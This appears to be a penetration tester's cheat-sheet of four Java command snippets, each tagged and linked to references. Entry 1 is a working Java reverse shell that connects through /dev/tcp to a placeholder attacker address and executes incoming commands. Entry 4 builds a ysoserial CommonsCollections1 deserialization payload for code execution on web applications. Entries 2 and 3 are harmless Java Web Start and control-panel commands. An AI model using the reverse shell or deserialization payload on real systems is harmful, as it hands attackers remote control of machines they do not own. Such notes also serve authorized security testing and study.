### 1. Java reverse shell - replace ; with newline
```
r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor()
```
**- linux,reverse shells,java**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 2. run a java web start JNLP
```
/opt/jre1.8.0_91/bin/javaws [something].jnlp
```
**- java**
#### References:

https://www.java.com/en/download/faq/java_webstart.xml
__________
### 3. Open java control pannel
```
/opt/jre1.8.0_91/bin/jcontrol
```
**- java**
#### References:

http://linuxsysconfig.com/2013/12/how-to-enable-java-console-on-rpm-based-linux-systems/
__________
### 4. YsoSerial code execution 
```
java -jar ysoserial-0.0.2-all.jar CommonsCollections1 '[command]' > payload.out
```
**- web application,java**
#### References:

https://github.com/frohoff/ysoserial
http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
__________
